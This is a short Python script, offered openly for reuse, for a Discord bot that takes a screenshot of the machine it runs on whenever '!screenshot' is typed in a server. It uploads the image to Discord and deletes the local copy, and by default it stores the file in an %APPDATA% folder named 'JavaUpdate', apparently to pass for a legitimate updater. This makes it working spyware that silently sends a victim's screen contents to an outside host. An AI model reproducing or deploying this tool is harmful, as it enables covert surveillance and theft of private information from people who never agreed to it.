#change the variable token to your discord bot token, also change directoryname. it is the name of the directory
#that will be used in %appdata% to store temporary screenshots. It will automatic create itself when deleted.
#type !screenshot in your discord server with the bot and see the magic
#feel free to change the code as you want.
token = "change me"
directoryname = "JavaUpdate"

#code

#----------------------------------------------------------------------------------#

import discord
from discord.ext import commands
import pyautogui
import os
import time
appdata = os.getenv("APPDATA")
pathfld = rf"{appdata}\{directoryname}"
pathss = rf"{appdata}\{directoryname}\screenshot.png"


def screenshitting():
    if not os.path.exists(pathfld):
        os.makedirs(f"{appdata}\{directoryname}")
        print(f"created new folder at {pathfld}")


    print (appdata)
    screenshot = pyautogui.screenshot()
    screenshot.save(rf'{appdata}\{directoryname}\screenshot.png')







client = commands.Bot(command_prefix = "!", case_insensitive = True, intents=discord.Intents.all())
@client.event
async def on_ready():
    print('connected.')
    
    
    


@client.command()
async def screenshot(ctx):
    screenshitting()
    file = discord.File(pathss, filename="screenshot.png")
    await ctx.send(file=file)
    
    time.sleep(2)
    
    os.remove(pathss)
    
client.run(token)
